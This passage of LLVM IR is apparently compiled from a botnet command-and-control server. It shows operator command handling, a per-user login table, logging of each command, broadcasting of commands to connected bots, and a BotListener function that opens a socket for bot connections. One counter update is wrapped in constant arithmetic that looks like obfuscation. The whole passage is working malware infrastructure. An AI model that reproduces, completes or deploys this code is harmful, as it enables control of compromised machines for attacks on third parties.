  %513 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i32 0, i32 0
  %514 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i32 0, i32 0
  %515 = call i64 @strlen(i8* %514) #8
  %516 = call i64 @send(i32 %512, i8* %513, i64 %515, i32 16384)
  %517 = icmp eq i64 %516, -1
  br i1 %517, label %518, label %519

; <label>:518:                                    ; preds = %511
  br label %878

; <label>:519:                                    ; preds = %511
  %520 = load i32, i32* %4, align 4
  %521 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i32 0, i32 0
  %522 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i32 0, i32 0
  %523 = call i64 @strlen(i8* %522) #8
  %524 = call i64 @send(i32 %520, i8* %521, i64 %523, i32 16384)
  %525 = icmp eq i64 %524, -1
  br i1 %525, label %526, label %527

; <label>:526:                                    ; preds = %519
  br label %878

; <label>:527:                                    ; preds = %519
  %528 = load i32, i32* %4, align 4
  %529 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i32 0, i32 0
  %530 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i32 0, i32 0
  %531 = call i64 @strlen(i8* %530) #8
  %532 = call i64 @send(i32 %528, i8* %529, i64 %531, i32 16384)
  %533 = icmp eq i64 %532, -1
  br i1 %533, label %534, label %535

; <label>:534:                                    ; preds = %527
  br label %878

; <label>:535:                                    ; preds = %527
  %536 = load i32, i32* %4, align 4
  %537 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i32 0, i32 0
  %538 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i32 0, i32 0
  %539 = call i64 @strlen(i8* %538) #8
  %540 = call i64 @send(i32 %536, i8* %537, i64 %539, i32 16384)
  %541 = icmp eq i64 %540, -1
  br i1 %541, label %542, label %543

; <label>:542:                                    ; preds = %535
  br label %878

; <label>:543:                                    ; preds = %535
  %544 = load i32, i32* %4, align 4
  %545 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i32 0, i32 0
  %546 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i32 0, i32 0
  %547 = call i64 @strlen(i8* %546) #8
  %548 = call i64 @send(i32 %544, i8* %545, i64 %547, i32 16384)
  %549 = icmp eq i64 %548, -1
  br i1 %549, label %550, label %551

; <label>:550:                                    ; preds = %543
  br label %878

; <label>:551:                                    ; preds = %543
  %552 = load i32, i32* %4, align 4
  %553 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i32 0, i32 0
  %554 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i32 0, i32 0
  %555 = call i64 @strlen(i8* %554) #8
  %556 = call i64 @send(i32 %552, i8* %553, i64 %555, i32 16384)
  %557 = icmp eq i64 %556, -1
  br i1 %557, label %558, label %559

; <label>:558:                                    ; preds = %551
  br label %878

; <label>:559:                                    ; preds = %551
  %560 = load i8*, i8** %3, align 8
  %561 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %560) #7
  %562 = load i32, i32* %4, align 4
  %563 = call i64 @send(i32 %562, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %564 = icmp eq i64 %563, -1
  br i1 %564, label %565, label %566

; <label>:565:                                    ; preds = %559
  br label %878

; <label>:566:                                    ; preds = %559
  br label %329

; <label>:567:                                    ; preds = %380
  %568 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %569 = call i8* @strstr(i8* %568, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.57, i32 0, i32 0)) #8
  %570 = icmp ne i8* %569, null
  br i1 %570, label %571, label %631

; <label>:571:                                    ; preds = %567
  %572 = load i8*, i8** %3, align 8
  %573 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %572) #7
  %574 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i32 0, i32 0
  %575 = call i32 (i8*, i8*, ...) @sprintf(i8* %574, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.58, i32 0, i32 0)) #7
  %576 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %577 = call i32 (i8*, i8*, ...) @sprintf(i8* %576, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.59, i32 0, i32 0)) #7
  %578 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i32 0, i32 0
  %579 = call i32 (i8*, i8*, ...) @sprintf(i8* %578, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.60, i32 0, i32 0)) #7
  %580 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i32 0, i32 0
  %581 = call i32 (i8*, i8*, ...) @sprintf(i8* %580, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.61, i32 0, i32 0)) #7
  %582 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i32 0, i32 0
  %583 = call i32 (i8*, i8*, ...) @sprintf(i8* %582, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.62, i32 0, i32 0)) #7
  %584 = load i32, i32* %4, align 4
  %585 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i32 0, i32 0
  %586 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i32 0, i32 0
  %587 = call i64 @strlen(i8* %586) #8
  %588 = call i64 @send(i32 %584, i8* %585, i64 %587, i32 16384)
  %589 = icmp eq i64 %588, -1
  br i1 %589, label %590, label %591

; <label>:590:                                    ; preds = %571
  br label %878

; <label>:591:                                    ; preds = %571
  %592 = load i32, i32* %4, align 4
  %593 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %594 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %595 = call i64 @strlen(i8* %594) #8
  %596 = call i64 @send(i32 %592, i8* %593, i64 %595, i32 16384)
  %597 = icmp eq i64 %596, -1
  br i1 %597, label %598, label %599

; <label>:598:                                    ; preds = %591
  br label %878

; <label>:599:                                    ; preds = %591
  %600 = load i32, i32* %4, align 4
  %601 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i32 0, i32 0
  %602 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i32 0, i32 0
  %603 = call i64 @strlen(i8* %602) #8
  %604 = call i64 @send(i32 %600, i8* %601, i64 %603, i32 16384)
  %605 = icmp eq i64 %604, -1
  br i1 %605, label %606, label %607

; <label>:606:                                    ; preds = %599
  br label %878

; <label>:607:                                    ; preds = %599
  %608 = load i32, i32* %4, align 4
  %609 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i32 0, i32 0
  %610 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i32 0, i32 0
  %611 = call i64 @strlen(i8* %610) #8
  %612 = call i64 @send(i32 %608, i8* %609, i64 %611, i32 16384)
  %613 = icmp eq i64 %612, -1
  br i1 %613, label %614, label %615

; <label>:614:                                    ; preds = %607
  br label %878

; <label>:615:                                    ; preds = %607
  %616 = load i32, i32* %4, align 4
  %617 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i32 0, i32 0
  %618 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i32 0, i32 0
  %619 = call i64 @strlen(i8* %618) #8
  %620 = call i64 @send(i32 %616, i8* %617, i64 %619, i32 16384)
  %621 = icmp eq i64 %620, -1
  br i1 %621, label %622, label %623

; <label>:622:                                    ; preds = %615
  br label %878

; <label>:623:                                    ; preds = %615
  %624 = load i8*, i8** %3, align 8
  %625 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %624) #7
  %626 = load i32, i32* %4, align 4
  %627 = call i64 @send(i32 %626, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %628 = icmp eq i64 %627, -1
  br i1 %628, label %629, label %630

; <label>:629:                                    ; preds = %623
  br label %878

; <label>:630:                                    ; preds = %623
  br label %329

; <label>:631:                                    ; preds = %567
  %632 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %633 = call i8* @strstr(i8* %632, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0)) #8
  %634 = icmp ne i8* %633, null
  br i1 %634, label %635, label %652

; <label>:635:                                    ; preds = %631
  %636 = getelementptr inbounds [2048 x i8], [2048 x i8]* %52, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %636, i8 0, i64 2048, i32 16, i1 false)
  %637 = getelementptr inbounds [2048 x i8], [2048 x i8]* %52, i32 0, i32 0
  %638 = call i32 (i8*, i8*, ...) @sprintf(i8* %637, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.64, i32 0, i32 0)) #7
  %639 = load i32, i32* %4, align 4
  %640 = getelementptr inbounds [2048 x i8], [2048 x i8]* %52, i32 0, i32 0
  %641 = getelementptr inbounds [2048 x i8], [2048 x i8]* %52, i32 0, i32 0
  %642 = call i64 @strlen(i8* %641) #8
  %643 = call i64 @send(i32 %639, i8* %640, i64 %642, i32 16384)
  %644 = icmp eq i64 %643, -1
  br i1 %644, label %645, label %646

; <label>:645:                                    ; preds = %635
  br label %878

; <label>:646:                                    ; preds = %635
  %647 = load i32, i32* %4, align 4
  %648 = call i64 @send(i32 %647, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %649 = icmp eq i64 %648, -1
  br i1 %649, label %650, label %651

; <label>:650:                                    ; preds = %646
  br label %878

; <label>:651:                                    ; preds = %646
  br label %329

; <label>:652:                                    ; preds = %631
  %653 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %654 = call i8* @strstr(i8* %653, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.65, i32 0, i32 0)) #8
  %655 = icmp ne i8* %654, null
  br i1 %655, label %656, label %763

; <label>:656:                                    ; preds = %652
  %657 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %657, i8 0, i64 2048, i32 16, i1 false)
  %658 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i32 0, i32 0
  %659 = call i32 (i8*, i8*, ...) @sprintf(i8* %658, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.66, i32 0, i32 0)) #7
  %660 = load i32, i32* %4, align 4
  %661 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i32 0, i32 0
  %662 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i32 0, i32 0
  %663 = call i64 @strlen(i8* %662) #8
  %664 = call i64 @send(i32 %660, i8* %661, i64 %663, i32 16384)
  %665 = icmp eq i64 %664, -1
  br i1 %665, label %666, label %667

; <label>:666:                                    ; preds = %656
  br label %878

; <label>:667:                                    ; preds = %656
  %668 = load i32, i32* %4, align 4
  %669 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i32 0, i32 0
  %670 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i32 0, i32 0
  %671 = call i64 @strlen(i8* %670) #8
  %672 = call i64 @send(i32 %668, i8* %669, i64 %671, i32 16384)
  %673 = icmp eq i64 %672, -1
  br i1 %673, label %674, label %675

; <label>:674:                                    ; preds = %667
  br label %878

; <label>:675:                                    ; preds = %667
  %676 = load i32, i32* %4, align 4
  %677 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %678 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %679 = call i64 @strlen(i8* %678) #8
  %680 = call i64 @send(i32 %676, i8* %677, i64 %679, i32 16384)
  %681 = icmp eq i64 %680, -1
  br i1 %681, label %682, label %683

; <label>:682:                                    ; preds = %675
  br label %878

; <label>:683:                                    ; preds = %675
  %684 = load i32, i32* %4, align 4
  %685 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %686 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %687 = call i64 @strlen(i8* %686) #8
  %688 = call i64 @send(i32 %684, i8* %685, i64 %687, i32 16384)
  %689 = icmp eq i64 %688, -1
  br i1 %689, label %690, label %691

; <label>:690:                                    ; preds = %683
  br label %878

; <label>:691:                                    ; preds = %683
  %692 = load i32, i32* %4, align 4
  %693 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %694 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %695 = call i64 @strlen(i8* %694) #8
  %696 = call i64 @send(i32 %692, i8* %693, i64 %695, i32 16384)
  %697 = icmp eq i64 %696, -1
  br i1 %697, label %698, label %699

; <label>:698:                                    ; preds = %691
  br label %878

; <label>:699:                                    ; preds = %691
  %700 = load i32, i32* %4, align 4
  %701 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %702 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i32 0, i32 0
  %703 = call i64 @strlen(i8* %702) #8
  %704 = call i64 @send(i32 %700, i8* %701, i64 %703, i32 16384)
  %705 = icmp eq i64 %704, -1
  br i1 %705, label %706, label %707

; <label>:706:                                    ; preds = %699
  br label %878

; <label>:707:                                    ; preds = %699
  %708 = load i32, i32* %4, align 4
  %709 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %710 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i32 0, i32 0
  %711 = call i64 @strlen(i8* %710) #8
  %712 = call i64 @send(i32 %708, i8* %709, i64 %711, i32 16384)
  %713 = icmp eq i64 %712, -1
  br i1 %713, label %714, label %715

; <label>:714:                                    ; preds = %707
  br label %878

; <label>:715:                                    ; preds = %707
  %716 = load i32, i32* %4, align 4
  %717 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %718 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %719 = call i64 @strlen(i8* %718) #8
  %720 = call i64 @send(i32 %716, i8* %717, i64 %719, i32 16384)
  %721 = icmp eq i64 %720, -1
  br i1 %721, label %722, label %723

; <label>:722:                                    ; preds = %715
  br label %878

; <label>:723:                                    ; preds = %715
  %724 = load i32, i32* %4, align 4
  %725 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %726 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %727 = call i64 @strlen(i8* %726) #8
  %728 = call i64 @send(i32 %724, i8* %725, i64 %727, i32 16384)
  %729 = icmp eq i64 %728, -1
  br i1 %729, label %730, label %731

; <label>:730:                                    ; preds = %723
  br label %878

; <label>:731:                                    ; preds = %723
  %732 = load i32, i32* %4, align 4
  %733 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %734 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %735 = call i64 @strlen(i8* %734) #8
  %736 = call i64 @send(i32 %732, i8* %733, i64 %735, i32 16384)
  %737 = icmp eq i64 %736, -1
  br i1 %737, label %738, label %739

; <label>:738:                                    ; preds = %731
  br label %878

; <label>:739:                                    ; preds = %731
  %740 = load i32, i32* %4, align 4
  %741 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %742 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %743 = call i64 @strlen(i8* %742) #8
  %744 = call i64 @send(i32 %740, i8* %741, i64 %743, i32 16384)
  %745 = icmp eq i64 %744, -1
  br i1 %745, label %746, label %747

; <label>:746:                                    ; preds = %739
  br label %878

; <label>:747:                                    ; preds = %739
  br label %748

; <label>:748:                                    ; preds = %747
  %749 = load i32, i32* %4, align 4
  %750 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %751 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i32 0, i32 0
  %752 = call i64 @strlen(i8* %751) #8
  %753 = call i64 @send(i32 %749, i8* %750, i64 %752, i32 16384)
  %754 = icmp eq i64 %753, -1
  br i1 %754, label %755, label %756

; <label>:755:                                    ; preds = %748
  br label %878

; <label>:756:                                    ; preds = %748
  %757 = load i32, i32* %4, align 4
  %758 = call i64 @send(i32 %757, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %759 = icmp eq i64 %758, -1
  br i1 %759, label %760, label %761

; <label>:760:                                    ; preds = %756
  br label %878

; <label>:761:                                    ; preds = %756
  br label %762

; <label>:762:                                    ; preds = %761
  br label %329

; <label>:763:                                    ; preds = %652
  %764 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %765 = call i8* @strstr(i8* %764, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #8
  %766 = icmp ne i8* %765, null
  br i1 %766, label %767, label %787

; <label>:767:                                    ; preds = %763
  %768 = load i8*, i8** %3, align 8
  %769 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %768) #7
  %770 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i32 0, i32 0
  %771 = call i32 (i8*, i8*, ...) @sprintf(i8* %770, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.68, i32 0, i32 0)) #7
  %772 = load i32, i32* %4, align 4
  %773 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i32 0, i32 0
  %774 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i32 0, i32 0
  %775 = call i64 @strlen(i8* %774) #8
  %776 = call i64 @send(i32 %772, i8* %773, i64 %775, i32 16384)
  %777 = icmp eq i64 %776, -1
  br i1 %777, label %778, label %779

; <label>:778:                                    ; preds = %767
  br label %878

; <label>:779:                                    ; preds = %767
  %780 = load i8*, i8** %3, align 8
  %781 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %780) #7
  %782 = load i32, i32* %4, align 4
  %783 = call i64 @send(i32 %782, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %784 = icmp eq i64 %783, -1
  br i1 %784, label %785, label %786

; <label>:785:                                    ; preds = %779
  br label %878

; <label>:786:                                    ; preds = %779
  br label %329

; <label>:787:                                    ; preds = %763
  %788 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %789 = call i8* @strstr(i8* %788, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.69, i32 0, i32 0)) #8
  %790 = icmp ne i8* %789, null
  br i1 %790, label %791, label %811

; <label>:791:                                    ; preds = %787
  %792 = load i8*, i8** %3, align 8
  %793 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %792) #7
  %794 = getelementptr inbounds [80 x i8], [80 x i8]* %55, i32 0, i32 0
  %795 = call i32 (i8*, i8*, ...) @sprintf(i8* %794, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.70, i32 0, i32 0)) #7
  %796 = load i32, i32* %4, align 4
  %797 = getelementptr inbounds [80 x i8], [80 x i8]* %55, i32 0, i32 0
  %798 = getelementptr inbounds [80 x i8], [80 x i8]* %55, i32 0, i32 0
  %799 = call i64 @strlen(i8* %798) #8
  %800 = call i64 @send(i32 %796, i8* %797, i64 %799, i32 16384)
  %801 = icmp eq i64 %800, -1
  br i1 %801, label %802, label %803

; <label>:802:                                    ; preds = %791
  br label %878

; <label>:803:                                    ; preds = %791
  %804 = load i8*, i8** %3, align 8
  %805 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %804) #7
  %806 = load i32, i32* %4, align 4
  %807 = call i64 @send(i32 %806, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %808 = icmp eq i64 %807, -1
  br i1 %808, label %809, label %810

; <label>:809:                                    ; preds = %803
  br label %878

; <label>:810:                                    ; preds = %803
  br label %329

; <label>:811:                                    ; preds = %787
  %812 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %813 = call i8* @strstr(i8* %812, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #8
  %814 = icmp ne i8* %813, null
  br i1 %814, label %815, label %833

; <label>:815:                                    ; preds = %811
  %816 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %816, i8 0, i64 2048, i32 16, i1 false)
  %817 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i32 0, i32 0
  %818 = load i32, i32* %5, align 4
  %819 = sext i32 %818 to i64
  %820 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %819
  %821 = getelementptr inbounds %struct.login_info, %struct.login_info* %820, i32 0, i32 0
  %822 = getelementptr inbounds [20 x i8], [20 x i8]* %821, i32 0, i32 0
  %823 = call i32 (i8*, i8*, ...) @sprintf(i8* %817, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.72, i32 0, i32 0), i8* %822) #7
  %824 = load i32, i32* %4, align 4
  %825 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i32 0, i32 0
  %826 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i32 0, i32 0
  %827 = call i64 @strlen(i8* %826) #8
  %828 = call i64 @send(i32 %824, i8* %825, i64 %827, i32 16384)
  %829 = icmp eq i64 %828, -1
  br i1 %829, label %830, label %831

; <label>:830:                                    ; preds = %815
  br label %878

; <label>:831:                                    ; preds = %815
  %832 = call i32 @sleep(i32 5)
  br label %878

; <label>:833:                                    ; preds = %811
  %834 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @trim(i8* %834)
  %835 = load i32, i32* %4, align 4
  %836 = call i64 @send(i32 %835, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 11, i32 16384)
  %837 = icmp eq i64 %836, -1
  br i1 %837, label %838, label %839

; <label>:838:                                    ; preds = %833
  br label %878

; <label>:839:                                    ; preds = %833
  %840 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %841 = call i64 @strlen(i8* %840) #8
  %842 = icmp eq i64 %841, 0
  br i1 %842, label %843, label %844

; <label>:843:                                    ; preds = %839
  br label %329

; <label>:844:                                    ; preds = %839
  %845 = load i32, i32* %5, align 4
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %846
  %848 = getelementptr inbounds %struct.login_info, %struct.login_info* %847, i32 0, i32 0
  %849 = getelementptr inbounds [20 x i8], [20 x i8]* %848, i32 0, i32 0
  %850 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %851 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.73, i32 0, i32 0), i8* %849, i8* %850)
  %852 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0))
  store %struct._IO_FILE* %852, %struct._IO_FILE** %57, align 8
  %853 = call i64 @time(i64* null) #7
  store i64 %853, i64* %58, align 8
  %854 = call %struct.tm* @gmtime(i64* %58) #7
  store %struct.tm* %854, %struct.tm** %59, align 8
  %855 = getelementptr inbounds [50 x i8], [50 x i8]* %60, i32 0, i32 0
  %856 = load %struct.tm*, %struct.tm** %59, align 8
  %857 = call i64 @strftime(i8* %855, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i32 0, i32 0), %struct.tm* %856) #7
  %858 = load %struct._IO_FILE*, %struct._IO_FILE** %57, align 8
  %859 = getelementptr inbounds [50 x i8], [50 x i8]* %60, i32 0, i32 0
  %860 = load i32, i32* %5, align 4
  %861 = sext i32 %860 to i64
  %862 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %861
  %863 = getelementptr inbounds %struct.login_info, %struct.login_info* %862, i32 0, i32 0
  %864 = getelementptr inbounds [20 x i8], [20 x i8]* %863, i32 0, i32 0
  %865 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %866 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %858, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i32 0, i32 0), i8* %859, i8* %864, i8* %865)
  %867 = load %struct._IO_FILE*, %struct._IO_FILE** %57, align 8
  %868 = call i32 @fclose(%struct._IO_FILE* %867)
  %869 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %870 = load i32, i32* %4, align 4
  %871 = load i32, i32* %5, align 4
  %872 = sext i32 %871 to i64
  %873 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %872
  %874 = getelementptr inbounds %struct.login_info, %struct.login_info* %873, i32 0, i32 0
  %875 = getelementptr inbounds [20 x i8], [20 x i8]* %874, i32 0, i32 0
  call void @broadcast(i8* %869, i32 %870, i8* %875)
  %876 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %876, i8 0, i64 2048, i32 16, i1 false)
  br label %329

; <label>:877:                                    ; preds = %329
  br label %878

; <label>:878:                                    ; preds = %877, %838, %831, %830, %809, %802, %785, %778, %760, %755, %746, %738, %730, %722, %714, %706, %698, %690, %682, %674, %666, %650, %645, %629, %622, %614, %606, %598, %590, %565, %558, %550, %542, %534, %526, %518, %510, %502, %494, %486, %478, %470, %462, %454, %446, %438, %430, %378, %355, %320, %315, %306, %298, %290, %282, %274, %266, %258, %250, %242, %234, %195, %194, %184, %165, %159, %134, %128
  %879 = load i32, i32* %4, align 4
  %880 = sext i32 %879 to i64
  %881 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %880
  %882 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %881, i32 0, i32 0
  store i32 0, i32* %882, align 4
  %883 = load i32, i32* %4, align 4
  %884 = call i32 @close(i32 %883)
  %885 = load volatile i32, i32* @OperatorsConnected, align 4
  %886 = sub i32 %885, 1493295221
  %887 = add i32 %886, -1
  %888 = add i32 %887, 1493295221
  %889 = add nsw i32 %885, -1
  store volatile i32 %888, i32* @OperatorsConnected, align 4
  br label %890

; <label>:890:                                    ; preds = %878, %373, %350
  %891 = load i8*, i8** %2, align 8
  ret i8* %891
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: nounwind
declare %struct.tm* @gmtime(i64*) #3

; Function Attrs: nounwind
declare i64 @strftime(i8*, i64, i8*, %struct.tm*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @BotListener(i32) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  %10 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %10, i32* %4, align 4
  %11 = load i32, i32* %4, align 4
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.78, i32 0, i32 0))
  br label %14

; <label>:14:                                     ; preds = %13, %1
  %15 = bitcast %struct.sockaddr_in* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* %15, i8 0, i64 16, i32 4, i1 false)
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  store i32 0, i32* %18, align 4
  %19 = load i32, i32* %3, align 4
  %20 = trunc i32 %19 to i16
  %21 = call zeroext i16 @htons(i16 zeroext %20) #9
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %21, i16* %22, align 2
  %23 = load i32, i32* %4, align 4
  %24 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %25 = call i32 @bind(i32 %23, %struct.sockaddr* %24, i32 16) #7
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %28

; <label>:27:                                     ; preds = %14
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.79, i32 0, i32 0))
  br label %28

; <label>:28:                                     ; preds = %27, %14
  %29 = load i32, i32* %4, align 4
  %30 = call i32 @listen(i32 %29, i32 5) #7
  store i32 16, i32* %6, align 4
  br label %31

; <label>:31:                                     ; preds = %38, %28
  %32 = load i32, i32* %4, align 4
  %33 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
